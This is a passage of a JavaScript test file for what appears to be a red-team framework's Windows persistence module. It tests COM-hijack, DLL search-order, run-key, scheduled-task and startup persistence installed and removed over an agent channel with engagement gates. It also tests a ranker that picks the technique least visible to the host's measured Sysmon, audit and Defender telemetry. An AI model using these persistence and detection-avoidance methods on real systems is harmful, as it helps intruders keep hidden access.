  const dllDeep = { host: HOST, as: 'apphelp.dll', dll: DLL, trigger: 'runkey' };
  const inRaw2 = await runPersistTask('persist-install', JSON.stringify({ techniques: ['dllsearch'], name: TAG, deep: dllDeep }), { runner, target: TARGET, defaultName: TAG, manifestPath: mpath });
  const ev2 = parsePersistEvidence(inRaw2);
  const drow = ev2.fields.techniques.dllsearch;
  assert.equal(drow.state, 'installed');
  assert.equal(drow.hostSha256, HOST_SHA);
  assert.equal(drow.files.length, 2);
  assert.ok(drow.files.every((f) => f.planted));
  // remove-failed escalates as its own event type — deep parity
  const stickyRunner = async () => ({ stdout: JSON.stringify({ op: 'remove', pid: 1, state: 'failed', techniques: { dllsearch: { state: 'removal-failed', technique: 'dllsearch', location: 'L', removalVerified: false, error: 'STILL PRESENT' } }, at: new Date().toISOString() }), stderr: '' });
  const ev3 = parsePersistEvidence(await runPersistTask('persist-remove', JSON.stringify({ techniques: ['dllsearch'] }), { runner: stickyRunner, target: TARGET, defaultName: TAG }));
  assert.equal(ev3.event, 'persist.remove-failed');
  assert.equal(ev3.fields.escalated, true);
  // engagement-clean tracks deep rows by technique+location like any other
  const loc = comHijackLocation(CLSID);
  const verdict = assessEngagementClean([
    { type: 'persist.installed', agentId: 'a', techniques: { 'comhijack-9B1F4D2E': { state: 'installed', technique: 'comhijack', location: loc } } },
  ]);
  assert.equal(verdict.clean, false);
  const verdict2 = assessEngagementClean([
    { type: 'persist.installed', agentId: 'a', techniques: { 'comhijack-9B1F4D2E': { state: 'installed', technique: 'comhijack', location: loc } } },
    { type: 'persist.removed', agentId: 'a', techniques: { 'comhijack-9B1F4D2E': { state: 'removed', location: loc, removalVerified: true } } },
  ]);
  assert.equal(verdict2.clean, true);
});

// ---------------- channel gate: deep specs ride the double gate + the audit hash pins deep params ----------------
test('channel gate: the engagement gate + spec gate cover deep techniques; persist.task carries the deep params + pins them in the hash', () => {
  const eng = freshEng();
  const events = [];
  const ch = new CallbackChannel({ scope: { engagement: eng, signedBy: 'test', cidrs: ['127.0.0.0/8'] }, onEvent: (t, o) => events.push({ type: t, ...o }) });
  const { agentId } = ch.registerAgent({ label: 'deep-gated' });
  // gate OFF: a deep install refuses exactly like a classic one
  assert.throws(() => ch.task(agentId, 'persist-install', JSON.stringify({ techniques: ['comhijack'], deep: { clsid: CLSID, dll: DLL } })),
    (e) => e.code === 'GOVERNANCE' && /persist\.enabled.*OFF/.test(e.message));
  assert.ok(events.some((e) => e.type === 'task.refused' && e.kind === 'persist-install'));
  // gate ON: deep spec queues; the audit event carries + pins the deep params
  Settings.for(eng).set('persist.enabled', true);
  const spec = { techniques: ['dllsearch'], name: 'OpDeep', deep: { host: HOST, as: 'apphelp.dll', dll: DLL, trigger: 'schtask' } };
  const taskId = ch.task(agentId, 'persist-install', JSON.stringify(spec));
  const ev = events.find((e) => e.type === 'persist.task' && e.taskId === taskId);
  assert.ok(ev);
  assert.deepEqual(ev.deep, { technique: 'dllsearch', host: HOST, dll: DLL, as: 'apphelp.dll', trigger: 'schtask' });
  assert.equal(ev.specSha256, persistSpecSha256(parsePersistSpec('persist-install', JSON.stringify(spec))), 'the audit hash pins exactly the normalized deep spec');
  assert.match(ev.specSha256, /^[0-9a-f]{64}$/);
  // a different deep param set hashes differently (the hash really pins the params)
  const other = persistSpecSha256(parsePersistSpec('persist-install', JSON.stringify({ ...spec, deep: { ...spec.deep, as: 'profapi.dll' } })));
  assert.notEqual(ev.specSha256, other);
  // a bad deep spec refuses pre-queue even with the gate open
  assert.throws(() => ch.task(agentId, 'persist-install', '{"techniques":["comhijack"],"deep":{"clsid":"bogus","dll":"C:\\\\x\\\\p.dll"}}'),
    (e) => e.code === 'GOVERNANCE' && /not a CLSID/.test(e.message));
  assert.equal(persistGate(eng).ok, true);
});

// ---------------- runPersistTask: deep params + prove ride the job ----------------
test('runPersistTask: deep params and prove ride the job verbatim; the aggregate state covers deep rows', async () => {
  let jobSeen = null;
  const runner = async (j) => { jobSeen = JSON.parse(j); return { stdout: JSON.stringify({ op: 'install', pid: 7, state: 'installed', techniques: { 'comhijack-9B1F4D2E': { state: 'installed', location: comHijackLocation(CLSID), installVerified: true } }, at: new Date().toISOString() }), stderr: '' }; };
  const deep = { clsid: CLSID, dll: DLL };
  const res = JSON.parse(await runPersistTask('persist-install', JSON.stringify({ techniques: ['comhijack'], name: 'OpX', deep }), { runner, target: TARGET, manifestPath: join(WORK, 'm2.json') }));
  assert.equal(res.state, 'installed');
  assert.deepEqual(jobSeen.deep, { technique: 'comhijack', clsid: CLSID, dll: DLL }, 'the normalized deep params ride the job');
  assert.equal(jobSeen.target, TARGET, 'the agent-captured relaunch line still rides (the channel never ships it)');
  let job2 = null;
  const runner2 = async (j) => { job2 = JSON.parse(j); return { stdout: JSON.stringify({ op: 'status', pid: 7, state: 'installed', techniques: { 'comhijack-9B1F4D2E': { state: 'installed', installVerified: true } }, at: new Date().toISOString() }), stderr: '' }; };
  await runPersistTask('persist-status', JSON.stringify({ techniques: ['comhijack'], prove: true }), { runner: runner2, target: TARGET });
  assert.equal(job2.prove, true, 'prove:true rides the status job (the benign resolve-proof runs agent-side)');
  const noProve = await runPersistTask('persist-status', '{"techniques":["comhijack"]}', { runner: runner2, target: TARGET });
  assert.ok(noProve);
});

// ---------------- EDR-aware selection: the ranking matrix ----------------
const postureFixture = (over = {}) => ({
  sysmon: null, security: null, taskScheduler: null, auditRegistry: null, auditOtherObjectAccess: null,
  saclOnKey: null, defenderRtp: null, defenderBehavior: null, asr: null, ...over,
});

test('rankPersistTechniques: no Sysmon => the registry-only deep technique ranks FIRST (lower predicted visibility)', () => {
  const posture = postureFixture({ sysmon: false, security: true, taskScheduler: true, auditRegistry: false, auditOtherObjectAccess: false, defenderRtp: true, defenderBehavior: true });
  const r = rankPersistTechniques(posture);
  assert.equal(r.ranking[0].technique, 'comhijack', 'no Sysmon + no registry-audit policy => comhijack has zero collected install-time signals');
  assert.equal(r.recommended, 'comhijack');
  assert.equal(r.ranking[0].score, 0);
  assert.equal(r.ranking[0].collected.length, 0);
  assert.equal(r.ranking.at(-1).technique, 'schtask', 'schtask is the most-collected here (TaskScheduler/106 + behavior watch)');
  // the full expected order: comhijack(0) < {dllsearch, runkey, startup}(1: behavior only) < schtask(2)
  assert.deepEqual(r.ranking.map((x) => [x.technique, x.score]), [['comhijack', 0], ['dllsearch', 1], ['runkey', 1], ['startup', 1], ['schtask', 2]]);
  assert.match(r.note, /NEVER an undetectability claim/i);
  assert.match(r.ranking[0].note, /NOT undetectability/);
  assert.ok(!/undetectable\b/i.test(r.ranking[0].verdict.replace(/NOT undetectability|undetectability/g, '')), 'the phrasing contract holds');
});

test('rankPersistTechniques: full telemetry (Sysmon + audit policy + SACL + behavior) => deep techniques rank LOUDEST, startup quietest', () => {
  const posture = postureFixture({ sysmon: true, security: true, taskScheduler: true, auditRegistry: true, auditOtherObjectAccess: true, saclOnKey: true, defenderRtp: true, defenderBehavior: true });
  const r = rankPersistTechniques(posture);
  assert.deepEqual(r.ranking.map((x) => [x.technique, x.score]), [['startup', 2], ['comhijack', 3], ['runkey', 4], ['schtask', 4], ['dllsearch', 5]],
    'with every sensor watching, the ordering inverts — the deep techniques are only quieter WHEN the posture lacks the sensors');
  assert.equal(r.ranking.at(-1).technique, 'dllsearch');
});

test('rankPersistTechniques: 4657 needs policy AND SACL — an unreadable SACL keeps it UNKNOWN (never assumed blind)', () => {
  const posture = postureFixture({ sysmon: false, security: true, auditRegistry: true, saclOnKey: null, defenderRtp: true, defenderBehavior: true });
  const r = rankPersistTechniques(posture, { techniques: ['comhijack'] });
  const sig4657 = r.ranking[0].unknown.find((s) => s.id === 4657);
  assert.ok(sig4657, '4657 sits in the unknown bucket when the SACL axis is unmeasured');
  assert.match(r.ranking[0].note, /ranking is PARTIAL/, 'unmeasured axes are stated, never smoothed over');
  // policy off => 4657 firmly not-collected
  const r2 = rankPersistTechniques(postureFixture({ sysmon: false, security: true, auditRegistry: false, saclOnKey: true }), { techniques: ['comhijack'] });
  assert.ok(r2.ranking[0].notCollected.some((s) => s.id === 4657));
  // security log unreadable => everything Security-derived is unknown
  const r3 = rankPersistTechniques(postureFixture({ sysmon: false, security: null }), { techniques: ['comhijack'] });
  assert.ok(r3.ranking[0].unknown.some((s) => s.id === 4657));
  // defender RTP off => the behavior watch is not-collected (the sensor is OFF, measured)
  const r4 = rankPersistTechniques(postureFixture({ sysmon: false, defenderRtp: false }), { techniques: ['startup'] });
  assert.ok(r4.ranking[0].notCollected.some((s) => s.signal === 'behavior-persistence-watch'));
});

test('telemetry profiles: every technique carries its install-time signals + a trigger model; the deep profiles have no task/file-create noise', () => {
  for (const t of PERSIST_ALL_TECHNIQUES) {
    assert.ok(PERSIST_TELEMETRY[t], t + ' has a telemetry profile');
    assert.ok(Array.isArray(PERSIST_TELEMETRY[t].signals) && PERSIST_TELEMETRY[t].signals.length > 0);
    assert.match(PERSIST_TRIGGER_MODELS[t], /fires /, t + ' states its trigger model');
  }
  const comIds = PERSIST_TELEMETRY.comhijack.signals.map((s) => `${s.log}:${s.id}`);
  assert.ok(!comIds.some((x) => x.includes('4698') || x.includes('TaskScheduler') || x.includes(':11')), 'comhijack install produces NO task log and NO file-create — that is the point');
  assert.ok(PERSIST_TELEMETRY.schtask.signals.some((s) => s.id === 4698));
  assert.ok(PERSIST_TELEMETRY.schtask.signals.some((s) => s.id === 106));
  assert.ok(PERSIST_TELEMETRY.runkey.signals.some((s) => s.id === 4657));
  assert.ok(PERSIST_TELEMETRY.dllsearch.signals.some((s) => s.id === 11), 'dllsearch plants files — Sysmon 11 is its signature');
  assert.equal(PERSIST_TELEMETRY.comhijack.class, 'deep');
  assert.equal(PERSIST_TELEMETRY.runkey.class, 'classic');
  // trigger models are the honest statements
  assert.match(PERSIST_TRIGGER_MODELS.comhijack, /opportunistic, NOT a guaranteed timer/);
  assert.match(PERSIST_TRIGGER_MODELS.dllsearch, /COPIED signed host/);
  assert.match(PERSIST_TRIGGER_MODELS.runkey, /NEXT interactive logon/);
});

test('postureFromMeasurements: merges the selector probe + edrview log reads + rangehard; explicit probe values win', () => {
  const p = postureFromMeasurements({
    persistPosture: { logs: { sysmon: false, security: true, defender: true, taskScheduler: true }, audit: { registry: false, otherObjectAccess: true }, saclOnKey: null },
    rangehard: { posture: { rtp: true, rtpStatus: true, behavior: false, asr: [{ id: 'x', action: 1 }, { id: 'y', action: 2 }, { id: 'z', action: 0 }], asrReadable: true } },
  });
  assert.equal(p.sysmon, false);
  assert.equal(p.security, true);
  assert.equal(p.taskScheduler, true);
  assert.equal(p.auditRegistry, false);
  assert.equal(p.auditOtherObjectAccess, true);
  assert.equal(p.saclOnKey, null, 'unreadable SACL stays unknown');
  assert.equal(p.defenderRtp, true);
  assert.equal(p.defenderBehavior, false);
  assert.deepEqual(p.asr, { readable: true, block: 1, audit: 1, other: 1 });
  // edrview fills the log axes when the selector probe is absent
  const p2 = postureFromMeasurements({ edrview: { checked: ['Security', 'Microsoft-Windows-Sysmon/Operational'], unavailable: [{ log: 'Microsoft-Windows-Windows Defender/Operational', reason: 'x' }] } });
  assert.equal(p2.sysmon, true);
  assert.equal(p2.security, true);
  assert.equal(p2.taskScheduler, null, 'unmeasured stays unknown');
  const p3 = postureFromMeasurements({ edrview: { checked: [], unavailable: ['Microsoft-Windows-Sysmon/Operational'] } });
  assert.equal(p3.sysmon, false, 'a Sysmon log that does not answer is measured-absent');
});

// ---------------- the selector over the governed channel (scripted taskAgent) ----------------
test('selectPersistTechniques: measures the posture over the channel and ranks; unreachable/unreadable stays honest', async () => {
  const postureLine = 'PERSISTPOSTURE ' + JSON.stringify({ logs: { sysmon: false, security: true, defender: true, taskScheduler: true }, audit: { registry: false, otherObjectAccess: false }, saclOnKey: null });
  const rangehardLine = 'RANGEHARD ' + JSON.stringify({ rtp: true, rtpStatus: true, maps: 2, pua: 1, behavior: true, ioav: true, scriptScan: true, tamper: true, exclPaths: [], exclExts: [], exclProcs: [], asrIds: [], asrActions: [], sigVersion: '1.0', sigAgeDays: 1 });
  const calls = [];
  const taskAgent = async (agentId, kind, data) => {
    calls.push(data);
    if (String(data).includes('auditpol')) return postureLine;
    return rangehardLine;
  };
  const r = await selectPersistTechniques({ taskAgent, agentId: 'agent-x' });
  assert.equal(r.reachable, true);
  assert.equal(r.recommended, 'comhijack', 'the measured posture (no Sysmon, no registry audit policy) ranks comhijack lowest-visibility');
  assert.equal(r.ranking[0].technique, 'comhijack');
  assert.equal(r.posture.defenderBehavior, true, 'the rangehard probe filled the behavior axis');
  assert.equal(r.posture.sysmon, false);
  assert.equal(calls.length, 2, 'exactly two read-only probes rode the channel');
  assert.match(r.note, /NEVER an undetectability claim/i);
  // unreachable: NO ranking (guesswork refused)
  const r2 = await selectPersistTechniques({ taskAgent: async () => null, agentId: 'agent-x' });
  assert.equal(r2.reachable, false);
  assert.equal(r2.ranking.length, 0);
  assert.match(r2.note, /NO ranking produced/);
  // unreadable posture line: fail-closed
  const r3 = await selectPersistTechniques({ taskAgent: async () => 'host noise, no marker', agentId: 'agent-x' });
  assert.equal(r3.reachable, true);
  assert.equal(r3.ranking.length, 0);
  assert.match(r3.note, /fail-closed/);
  // rangehard silent: the ranking still runs, the Defender axes sit unknown + stated
  const r4 = await selectPersistTechniques({ taskAgent: async (a, k, d) => (String(d).includes('auditpol') ? postureLine : null), agentId: 'agent-x' });
  assert.equal(r4.ranking.length > 0, true);
  assert.equal(r4.posture.defenderBehavior, null);
  assert.match(r4.note, /UNMEASURED/);
});

test('buildPersistPostureCommand/parsePersistPosture: the probe shape + the fail-closed parser', () => {
  const cmd = buildPersistPostureCommand();
  assert.match(cmd, /Get-WinEvent -ListLog/);
  assert.match(cmd, /Microsoft-Windows-Sysmon\/Operational/);
  assert.match(cmd, /TaskScheduler\/Operational/, 'the TaskScheduler log existence is measured (schtask 106 visibility)');
  assert.match(cmd, /auditpol \/get \/subcategory:'\{0CCE921E-69AE-11D9-BED3-505054503030\}'/, 'the Registry audit subcategory rides by GUID (no nested-quote escaping)');
  assert.match(cmd, /Get-Acl .* -Audit/s, 'the SACL readability probe is present');
  const parsed = parsePersistPosture('PERSISTPOSTURE {"logs":{"sysmon":true,"security":false,"defender":true,"taskScheduler":null},"audit":{"registry":true,"otherObjectAccess":null},"saclOnKey":false}');
  assert.deepEqual(parsed, { logs: { sysmon: true, security: false, defender: true, taskScheduler: null }, audit: { registry: true, otherObjectAccess: null }, saclOnKey: false });
  assert.equal(parsePersistPosture('garbage'), null);
  assert.equal(parsePersistPosture('PERSISTPOSTURE {bad json'), null);
  assert.equal(parsePersistPosture(null), null);
});

// ---------------- GUARDED LIVE: real PS host, real HKCU classes hive, SAFE abandoned class ONLY ----------------
// Opt-in ONLY (VARVEL_LIVE_PERSIST=1). Installs a user-context COM hijack on a made-up
// CLSID probed ABSENT from BOTH hives first (classifier: safe-abandoned — nothing
// working is altered), pointing at an INERT artifact under .tmp; proves the hijack
// RESOLVES via a throwaway-child instantiation (the child exits cleanly); removes;
// verifies absence at the registry level; sweeps clean. Self-cleaning even on failure
// (try/finally; the runner dies with the test). NOTHING touches HKLM.
const LIVE = process.env.VARVEL_LIVE_PERSIST === '1';
const LIVE_CANDIDATES = ['{9B1F4D2E-6A3C-4E7B-A5D8-1C2E3F4A5B6C}', '{4C8E2A1F-7B5D-4F3C-9E6A-2D8B5C1F3A7E}'];

test('LIVE (guarded): safe-abandoned comhijack — install verified, resolve-proof via throwaway child, remove verified ABSENT, sweep clean (self-cleaning)', async (t) => {
  if (!LIVE) return t.skip('guarded live test — set VARVEL_LIVE_PERSIST=1 to run (writes+removes ONE user-context HKCU classes-hive hijack on a probed-abandoned CLSID on this machine)');
  if (process.platform !== 'win32') return t.skip('windows-only (user-land registry techniques)');
  const ps = spawnSync('powershell.exe', ['-NoProfile', '-NonInteractive', '-Command', 'exit 0'], { windowsHide: true });
  if (ps.error || ps.status !== 0) return t.skip('powershell.exe unavailable on this host');
  if (!existsSync(PERSIST_HOST_PATH)) return t.skip('agents/persist-host.ps1 missing');

  // pick the first candidate registered in NEITHER hive (a truly abandoned class)
  const regAbsent = (clsid) => {
    const hkcu = spawnSync('reg.exe', ['query', 'HKCU\\Software\\Classes\\CLSID\\' + clsid], { windowsHide: true });
    const hklm = spawnSync('reg.exe', ['query', 'HKLM\\Software\\Classes\\CLSID\\' + clsid], { windowsHide: true });
    return hkcu.status !== 0 && hklm.status !== 0;
  };
  const clsid = LIVE_CANDIDATES.find(regAbsent);
  if (!clsid) return t.skip('no probed-abandoned candidate CLSID available on this box (all candidates registered) — refusing to touch a live class');

  const liveName = ('VARVEL-LIVE-' + Date.now().toString(36)).slice(0, 32);
  const dllPath = join(WORK, liveName + '.dll');
  writeFileSync(dllPath, 'VARVEL inert COM resolve-proof artifact (not a PE) — safe to load-fail\n');
  const manifestPath = join(WORK, 'live-deep-manifest.json');
  const liveTarget = '"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -NoProfile -WindowStyle Hidden -Command "exit 0"'; // inert by construction
  const hkcuKey = 'HKCU\\Software\\Classes\\CLSID\\' + clsid;
  const regQ = (args) => spawnSync('reg.exe', args, { windowsHide: true });
  const runner = powerShellPersistRunner({ timeoutMs: 60000 });
  const deep = { clsid, dll: dllPath };
  try {
    // INSTALL: classified safe-abandoned, write verified by re-read
    const ins = JSON.parse(await runPersistTask('persist-install', JSON.stringify({ techniques: ['comhijack'], name: liveName, deep }), { runner, target: liveTarget, manifestPath, defaultName: liveName }));
    const key0 = Object.keys(ins.techniques)[0];
    assert.equal(ins.state, 'installed', JSON.stringify(ins.techniques[key0]));
    assert.equal(key0, 'comhijack-' + clsid.toUpperCase().replace(/[{}-]/g, '').slice(0, 8));
    assert.equal(ins.techniques[key0].classification, 'safe-abandoned', 'the live classifier confirms nothing working is altered');
    assert.equal(ins.techniques[key0].shadow, false);
    assert.equal(ins.techniques[key0].installVerified, true);
    assert.match(ins.techniques[key0].triggerModel, /NOT a guaranteed timer/);
    assert.ok(ins.techniques[key0].dllSha256, 'the payload hash is evidenced');
    const q1 = regQ(['query', hkcuKey + '\\InprocServer32', '/ve']);
    assert.equal(q1.status, 0, 'the hijack really landed in the HKCU classes hive (user-context)');
    assert.ok(String(q1.stdout).includes(dllPath), 'the InprocServer32 (Default) points at the inert payload');
    // STATUS with the benign resolve-proof: a throwaway child instantiates the CLSID
    const st = JSON.parse(await runPersistTask('persist-status', JSON.stringify({ techniques: ['comhijack'], name: liveName, deep, prove: true }), { runner, target: liveTarget, manifestPath, defaultName: liveName }));
    const sev = st.techniques[key0];
    assert.equal(sev.state, 'installed');
    assert.ok(sev.resolveProof, 'the proof outcome rides the status evidence');
    assert.equal(sev.resolveProof.attempted, true);
    assert.equal(sev.resolveProof.resolved, true, 'the hijack RESOLVES (COM located our registration and attempted the load — the inert artifact load-fails, which is the honest proof shape)');
    assert.equal(sev.resolveProof.childExited, true, 'the throwaway proof child exited');
    assert.equal(sev.resolveProof.childExitCode, 0, 'the proof child exited CLEANLY');
    // REMOVE: verified ABSENT
    const rem = JSON.parse(await runPersistTask('persist-remove', JSON.stringify({ techniques: ['comhijack'], name: liveName, deep }), { runner, target: liveTarget, manifestPath, defaultName: liveName }));
    assert.equal(rem.state, 'removed', JSON.stringify(rem.techniques[key0]));
    assert.equal(rem.techniques[key0].removalVerified, true, 'cleanup-proof: absence proven by re-read');
    assert.notEqual(regQ(['query', hkcuKey]).status, 0, 'the whole per-user CLSID key is gone (we created it; the container went with it)');
    // AUDIT: the sweep closes clean
    const au = JSON.parse(await runPersistTask('persist-audit', '', { runner, target: liveTarget, manifestPath, defaultName: liveName }));
    assert.equal(au.clean, true, JSON.stringify(au.open));
  } finally {
    // self-cleaning even on failure: best-effort remove, registry sweep, then the host dies
    try { await runPersistTask('persist-remove', JSON.stringify({ all: true, name: liveName }), { runner, target: liveTarget, manifestPath, defaultName: liveName }); } catch {}
    runner.close();
    try { regQ(['delete', hkcuKey, '/f']); } catch {}
    try { rmSync(dllPath, { force: true }); } catch {}
  }
});
